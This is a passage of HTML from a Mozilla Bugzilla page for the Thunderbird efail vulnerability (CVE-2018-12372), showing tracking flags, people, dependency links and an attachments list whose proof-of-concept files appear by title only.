          id="v5236_cf_tracking_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_esr91-dirty">
  <select id="cf_status_thunderbird_esr91" name="cf_status_thunderbird_esr91">
        <option value="---"
          id="v5242_cf_status_thunderbird_esr91" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird60</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_60-dirty">
  <select id="cf_status_thunderbird_60" name="cf_status_thunderbird_60">
        <option value="fixed"
          id="v3574_cf_status_thunderbird_60" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird61</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_61-dirty">
  <select id="cf_status_thunderbird_61" name="cf_status_thunderbird_61">
        <option value="wontfix"
          id="v3683_cf_status_thunderbird_61" selected
        >wontfix
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird62</td>
          <td class="tracking-flag-tracking"></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_62-dirty">
  <select id="cf_status_thunderbird_62" name="cf_status_thunderbird_62">
        <option value="fixed"
          id="v3765_cf_status_thunderbird_62" selected
        >fixed
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird93</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_93-dirty">
  <select id="cf_tracking_thunderbird_93" name="cf_tracking_thunderbird_93">
        <option value="---"
          id="v5262_cf_tracking_thunderbird_93" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_93-dirty">
  <select id="cf_status_thunderbird_93" name="cf_status_thunderbird_93">
        <option value="---"
          id="v5256_cf_status_thunderbird_93" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird94</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_94-dirty">
  <select id="cf_tracking_thunderbird_94" name="cf_tracking_thunderbird_94">
        <option value="---"
          id="v5300_cf_tracking_thunderbird_94" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_94-dirty">
  <select id="cf_status_thunderbird_94" name="cf_status_thunderbird_94">
        <option value="---"
          id="v5304_cf_status_thunderbird_94" selected
        >---
        </option>
  </select></td>
      </tr>
      <tr>
        <td class="tracking-flag-name">thunderbird95</td>
          <td class="tracking-flag-tracking"><input type="hidden" id="cf_tracking_thunderbird_95-dirty">
  <select id="cf_tracking_thunderbird_95" name="cf_tracking_thunderbird_95">
        <option value="---"
          id="v5332_cf_tracking_thunderbird_95" selected
        >---
        </option>
  </select></td>
        <td class="tracking-flag-status"><input type="hidden" id="cf_status_thunderbird_95-dirty">
  <select id="cf_status_thunderbird_95" name="cf_status_thunderbird_95">
        <option value="---"
          id="v5326_cf_status_thunderbird_95" selected
        >---
        </option>
  </select></td>
      </tr>
  </table>
</div>
    </div>

  
</div>

</div>
  </div>
</section>



<section class="module" id="module-people"
>
    <header id="module-people-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse People section"
           data-label-collapsed="Expand People section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-people-content"
             aria-expanded="false"
             aria-labeledby="module-people-title"
             aria-describedby="module-people-subtitle"></div>
        <h2 class="module-title" id="module-people-title">People</h2>
          <h3 class="module-subtitle" id="module-people-subtitle">
            (Reporter: jens.a.mueller, Assigned: jorgk-bmo)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-people-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-hide" id="field-assigned_to"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to"><div class="vcard vcard_176914" ><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">jorgk-bmo</span></a>
</div>
        </span>
    </div>

  
</div><div class="field edit-show" id="field-assigned_to" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to" id="assigned_to-help-link" class="help">Assignee:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-assigned_to">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-assignee" name="set_default_assignee" class="set-default"
          value="1" data-for="assigned_to">
        <label for="set-default-assignee">Reset Assignee to default</label>
      </div>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-bug_mentors" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor" id="bug_mentors-help-link" class="help">Mentors:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_mentors">---
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-qa_contact" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact" id="qa_contact-help-link" class="help">QA Contact:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-qa_contact">
      <div class="set-default-container" style="display:none">
        <input type="checkbox" id="set-default-qa-contact" name="set_default_qa_contact" class="set-default"
          value="1" data-for="qa_contact">
        <label for="set-default-qa-contact">Reset QA Contact to default</label>
      </div>
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-reporter"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter" id="reporter-help-link" class="help">Reporter:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-reporter">
            <div class="vcard vcard_588172" ><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=40" class="gravatar" width="20" height="20"> <a class="email " href="/user_profile?user_id=588172" > <span class="fna">jens.a.mueller</span></a>
</div>

        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-triage_owner" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner" id="triage_owner-help-link" class="help">Triage Owner:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-triage_owner">
            ---

        </span>
    </div>

  
</div>

    

    <div class="field"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc" id="-help-link" class="help">CC:
        </a>
    </div>


  
    <div class=" container">


        <span aria-owns="cc-summary cc-latch">
          <span role="button" tabindex="0" id="cc-summary" data-count="16">16 people
          </span>
        </span>


        <div id="cc-list" style="display:none"></div>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-references"
>
    <header id="module-references-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse References section"
           data-label-collapsed="Expand References section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-references-content"
             aria-expanded="false"
             aria-labeledby="module-references-title"
             aria-describedby="module-references-subtitle"></div>
        <h2 class="module-title" id="module-references-title">References</h2>
          <h3 class="module-subtitle" id="module-references-subtitle">
            (Depends on 1 open bug, <div class="link">
    <a href="https://efail.de/" target="_blank"
      rel="noreferrer" title="https://efail.de/"
      class="bug-url" data-safe="1">URL</a>
  </div>)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-references-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field bug-list" id="field-dependson"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson" id="dependson-help-link" class="help">Depends on:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-dependson">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_REOPENED"
   title="REOPENED - Build error: cannot convert ‘nsPresState*’ to ‘mozilla::PresState*’ caused by left-over nsILayoutHistoryState.h in source tree"
   href="/show_bug.cgi?id=1462794">1462794</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - fix efail PoC 3: Leaking plaintext through src attribute"
   href="/show_bug.cgi?id=1457721">CVE-2018-5162</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - In &quot;original HTML&quot; and &quot;simple HTML&quot; view the body of the message is placed outside &lt;div class=moz-text-html&gt;"
   href="/show_bug.cgi?id=1462895">1462895</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WORKSFORME - Crash on startup for self-built Thunderbird"
   href="/show_bug.cgi?id=1463047">1463047</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - New HTML processing introduced in bug 1419417 causes badly rendered HTML"
   href="/show_bug.cgi?id=1464391">1464391</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Detaching attachments corrupts the main body of the e-mail text"
   href="/show_bug.cgi?id=1473893">1473893</a>
      </div>
      <div class="bug-list">
        <span class="bug-type-label iconic" title="enhancement"
              aria-label="enhancement" data-type="enhancement">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - prevent form submission for &lt;button&gt; too"
   href="/show_bug.cgi?id=1450345">CVE-2018-5185</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying"
   href="/show_bug.cgi?id=1462488">1462488</a>
      </div>

        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-blocked" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks" id="blocked-help-link" class="help">Blocks:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-blocked">
        ---
        </span>
    </div>

  
</div><div class="field" id="field-dependencytree"
>
    <div class="name">
    </div>


  
    <div class=" container">
        <span id="field-value-dependencytree">
        Dependency <a href="/showdependencytree.cgi?id=1419417&amp;hide_resolved=1">tree</a>
        / <a href="/showdependencygraph.cgi?id=1419417">graph</a>
        </span>
    </div>

  
</div>

    <div class="field bug-list edit-show" id="field-regresses" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses" id="regresses-help-link" class="help">Regressions:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regresses">
        ---
        </span>
    </div>

  
</div><div class="field bug-list edit-show" id="field-regressed_by" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by" id="regressed_by-help-link" class="help">Regressed by:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-regressed_by">
        ---
        </span>
    </div>

  
</div>

    <div class="field bug-list"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#duplicates" id="-help-link" class="help">Duplicates:
        </a>
    </div>


  
    <div class="value">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE - HTML Attachment display affects base message"
   href="/show_bug.cgi?id=107035">107035</a>, <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1420217">1420217</a>
      </div>

    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field" id="field-bug_file_loc"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc" id="bug_file_loc-help-link" class="help">URL:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-bug_file_loc"><div class="link">
    <a href="https://efail.de/" target="_blank"
      rel="noreferrer" title="https://efail.de/"
      class="bug-url" data-safe="1">efail.de</a>
  </div>
        </span>
    </div>

  
</div>

    <div class="field" id="field-see_also"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also" id="see_also-help-link" class="help">See Also:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-see_also">
            <div class="bug-list">
        <span class="bug-type-label iconic" title="defect"
              aria-label="defect" data-type="defect">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1420217">1420217</a>
      </div>
      <div class="bug-list">
        <span class="bug-type-label iconic" title="enhancement"
              aria-label="enhancement" data-type="enhancement">
          <span class="icon" aria-hidden="true"></span>
        </span><a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - HTML Sanitizer class cleanup"
   href="/show_bug.cgi?id=1462481">1462481</a>
      </div>

        </span>
    </div>

  
</div>
</div>
  </div>
</section>


<section class="module" id="module-details"
>
    <header id="module-details-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Details section"
           data-label-collapsed="Expand Details section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-details-content"
             aria-expanded="false"
             aria-labeledby="module-details-title"
             aria-describedby="module-details-subtitle"></div>
        <h2 class="module-title" id="module-details-title">Details</h2>
          <h3 class="module-subtitle" id="module-details-subtitle">
            (Keywords: sec-high)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-details-content" style="display:none"
  ><div class="fields-lhs">

    <div class="field edit-show" id="field-alias" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias" id="alias-help-link" class="help">Alias:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-alias">
            CVE-2018-12372

        </span>
    </div>

  
</div>

    <div class="field" id="field-keywords"
>
    <div class="name">
        <a href="/describekeywords.cgi" id="keywords-help-link" class="help">Keywords:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-keywords">
          <a href="/buglist.cgi?keywords=sec-high&amp;resolution=---">sec-high</a>
        </span>
    </div>

  
</div>

    <div class="field edit-show" id="field-status_whiteboard" style="display:none"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/Whiteboard" id="status_whiteboard-help-link" class="help">Whiteboard:
        </a>
    </div>


  
    <div class="value">
        <span id="field-value-status_whiteboard">---
        </span>
    </div>

  
</div>

    

    

    <div class="field" id="field-votes"
>
    <div class="name">
        <a href="https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes" id="votes-help-link" class="help">Votes:
        </a>
    </div>


  
    <div class=" container">
        <span id="field-value-votes">0
        </span>
    </div>

  
</div>
</div><div class="fields-rhs">

    <div class="field edit-show" id="field-bug_flags" style="display:none"
>
    <div class="name">Bug Flags:
    </div>


  
    <div class=" container">
        <span id="field-value-bug_flags"><div id="bug-flags" class="flags">
  <table class="layout-table">
    <tbody class="edit-show" style="display:none"><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="This bug should be considered by thunderbird-drivers and developers as high-value and worthy of design &amp; review attention if a contributor offers a patch." for="flag_type-598">wanted-thunderbird</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-598-dirty">
      <select id="flag_type-598" name="flag_type-598"
        title="This bug should be considered by thunderbird-drivers and developers as high-value and worthy of design &amp; review attention if a contributor offers a patch."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug." for="flag_type-803">sec-bounty</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-803-dirty">
      <select id="flag_type-803" name="flag_type-803"
        title="Flag is used to track security bug bounty nominations. Mail security(at)mozilla.org to nominate a bug."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame." for="flag_type-913">sec-bounty-hof</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-913-dirty">
      <select id="flag_type-913" name="flag_type-913"
        title="Flag is used to track whether the bug report is eligible for inclusion in the Bug Bounty Hall of Fame."
          disabled
        class="bug-flag">
          <option value="X"></option>
      </select>
    </td>


  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-787">in-qa-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-787-dirty">
      <select id="flag_type-787" name="flag_type-787"
        title="Whether the bug has a testcase in the qa test suite or not. Set it to &quot;in-qa-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-qa-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-qa-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>

      <td class="flag-requestee">
        <div id="requestee_type-787-container" style="display:none"><input
    name="requestee_type-787"
    value="" class="requestee bz_autocomplete_user"  id="requestee_type-787" 
  >
        </div>
      <td>

  </tr><tr>
    <td class="flag-setter">
    </td>

    <td class="flag-name">
      <label title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword." for="flag_type-37">in-testsuite</label>
    </td>

    <td class="flag-value">
      <input type="hidden" id="flag_type-37-dirty">
      <select id="flag_type-37" name="flag_type-37"
        title="Whether the bug has a testcase in the test suite or not. Set it to &quot;in-testsuite?&quot; if the bug needs a testcase (only set this if the bug actually *needs* a testcase - not all bugs do, even layout bugs!), set it to &quot;in-testsuite+&quot; if the bug has an appropriate testcase, and set it to &quot;in-testsuite-&quot; if the bug doesn't need an explicit testcase (e.g. for code cleanup bugs). Only QA actively working on test cases in the component should use this keyword."
        class="bug-flag">
          <option value="X"></option>
            <option value="?" >?</option>
            <option value="+" >+</option>
            <option value="-" >-</option>
      </select>
    </td>


  </tr>
    </tbody>
  </table>
</div>
        </span>
    </div>

  
</div>
</div>

  
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-crash-data"
>
    <header id="module-crash-data-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Crash Data section"
           data-label-collapsed="Expand Crash Data section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-crash-data-content"
             aria-expanded="false"
             aria-labeledby="module-crash-data-title"
             aria-describedby="module-crash-data-subtitle"></div>
        <h2 class="module-title" id="module-crash-data-title">Crash Data</h2>
      </div>
    </header>
  <div class="module-content" id="module-crash-data-content" style="display:none"
  ><div class="field edit-show" id="field-cf_crash_signature" style="display:none"
>
    <div class="name">Signature:
    </div>


  
    <div class="value">
        <span id="field-value-cf_crash_signature">
        </span>
    </div>

  
</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-security"
>
    <header id="module-security-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Security section"
           data-label-collapsed="Expand Security section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-security-content"
             aria-expanded="false"
             aria-labeledby="module-security-title"
             aria-describedby="module-security-subtitle"></div>
        <h2 class="module-title" id="module-security-title">Security</h2>
          <h3 class="module-subtitle" id="module-security-subtitle">
            (public)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-security-content" style="display:none"
  ><div class="groups edit-hide">
    This bug is publicly visible.
</div>

<div class="groups edit-show" style="display:none">


</div>
  </div>
</section>


<section class="module edit-show" style="display:none" id="module-user-story" data-non-stick="1"
>
    <header id="module-user-story-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse User Story section"
           data-label-collapsed="Expand User Story section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-user-story-content"
             aria-expanded="false"
             aria-labeledby="module-user-story-title"
             aria-describedby="module-user-story-subtitle"></div>
        <h2 class="module-title" id="module-user-story-title">User Story</h2>
      </div>
    </header>
  <div class="module-content" id="module-user-story-content" style="display:none"
  >
    <pre id="user-story"></pre>
  </div>
</section>







<section class="module" id="module-attachments"
>
    <header id="module-attachments-header" class="module-header">
      <div class="module-latch"
           data-label-expanded="Collapse Attachments section"
           data-label-collapsed="Expand Attachments section">
        <div class="module-spinner" role="button" tabindex="0"
             aria-controls="module-attachments-content"
             aria-expanded="true"
             aria-labeledby="module-attachments-title"
             aria-describedby="module-attachments-subtitle"></div>
        <h2 class="module-title" id="module-attachments-title">Attachments</h2>
          <h3 class="module-subtitle" id="module-attachments-subtitle">
            (18 files, 22 obsolete files)
          </h3>
      </div>
    </header>
  <div class="module-content" id="module-attachments-content"
  ><table role="table" class="layout-table" id="attachments">
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8930484">Decryption oracle PoC 1: Leaking plaintext through reply/forward</a>
        </div>
        <div>
            <a href="#c0" class="attach-time activity-ref"><span class="rel-time" title="2017-11-21 06:34 PST" data-time="1511274891">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div></span>
        </div>
        <div class="attach-info">3.45 KB,
          text/plain        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8930484&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8930485">Decryption oracle PoC 2: Leaking plaintext through HTML forms</a>
        </div>
        <div>
            <a href="#c1" class="attach-time activity-ref"><span class="rel-time" title="2017-11-21 06:35 PST" data-time="1511274951">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div></span>
        </div>
        <div class="attach-info">3.84 KB,
          message/rfc822        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8930485&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8930486">Decryption oracle PoC 3: Leaking plaintext through src attribute</a>
        </div>
        <div>
            <a href="#c2" class="attach-time activity-ref"><span class="rel-time" title="2017-11-21 06:36 PST" data-time="1511274962">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div></span>
        </div>
        <div class="attach-info">3.33 KB,
          text/plain        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8930486&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8930487">Signature spoofing PoC 1: Impersonating Phil Zimmermann with CSS and plaintext tag</a>
        </div>
        <div>
            <a href="#c3" class="attach-time activity-ref"><span class="rel-time" title="2017-11-21 06:36 PST" data-time="1511274975">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div></span>
        </div>
        <div class="attach-info">4.06 KB,
          message/rfc822        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8930487&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8930488">Signature spoofing PoC 2: Impersonating Phil Zimmermann with invisible iframe tag</a>
        </div>
        <div>
            <a href="#c4" class="attach-time activity-ref"><span class="rel-time" title="2017-11-21 06:36 PST" data-time="1511274986">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_588172" ><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div></span>
        </div>
        <div class="attach-info">4.06 KB,
          message/rfc822        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8930488&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8973795">bug1419417_efail_reply_fwd.patch</a>
        </div>
        <div>
            <a href="#c23" class="attach-time activity-ref"><span class="rel-time" title="2018-05-07 12:36 PDT" data-time="1525721774">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_101158" ><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div></span>
        </div>
        <div class="attach-info">2.29 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#c42"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526302221"
            >
              review-</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8973795&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8973795&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8973795">Splinter Review</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8975458">A1-dec-pgp-smime-html-reply.eml</a>
        </div>
        <div>
            <a href="#c41" class="attach-time activity-ref"><span class="rel-time" title="2018-05-14 05:27 PDT" data-time="1526300831">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_176914" ><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.04 KB,
          text/plain        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8975458&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-obsolete
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8975520"
              title="tb-smime-leak-1.png"
              class="lightbox">
              <img src="/extensions/BugModal/web/image.png" width="16" height="16">tb-smime-leak-1.png
            </a>
        </div>
        <div>
            <a href="#c45" class="attach-time activity-ref"><span class="rel-time" title="2018-05-14 08:49 PDT" data-time="1526312940">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">92.03 KB,
          image/png        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8975520&amp;action=edit">Details</a>
    </tr>
    <tr class="
    " >
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8975523"
              title="tb-smime-leak-2.png"
              class="lightbox">
              <img src="/extensions/BugModal/web/image.png" width="16" height="16">tb-smime-leak-2.png
            </a>
        </div>
        <div>
            <a href="#c46" class="attach-time activity-ref"><span class="rel-time" title="2018-05-14 08:55 PDT" data-time="1526313359">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">90.96 KB,
          image/png        </div>
      </td>
      <td>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8975523&amp;action=edit">Details</a>
    </tr>
    <tr class=" attach-obsolete attach-patch
    " style="display:none">
      <td class="attach-desc-td">
        <div class="attach-desc">
            <a href="/attachment.cgi?id=8976050">Sanitize quoted HTML</a>
        </div>
        <div>
            <a href="#c59" class="attach-time activity-ref"><span class="rel-time" title="2018-05-15 23:47 PDT" data-time="1526453226">4 years ago</span></a>
          <span class="attach-author"><div class="vcard vcard_22599" ><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div></span>
        </div>
        <div class="attach-info">2.68 KB,
          patch        </div>
      </td>
      <td>
          <div class="attach-flag"><div class="vcard vcard_176914" ><span class="fn">jorgk-bmo</span>
</div>:
              <a href="#c62"
                  class="flag-name-status rel-time-title activity-ref"
                  title="4 years ago"
              data-time="1526455973"
            >
              review-</a>
          </div>
      </td>
      <td class="attach-actions">
        <a href="/attachment.cgi?id=8976050&amp;action=edit">Details</a>
          | <a href="/attachment.cgi?id=8976050&amp;action=diff">Diff</a>&#x0020; |
  <a href="/page.cgi?id=splinter.html&ignore=&bug=1419417&attachment=8976050">Splinter Review</a>
    </tr>
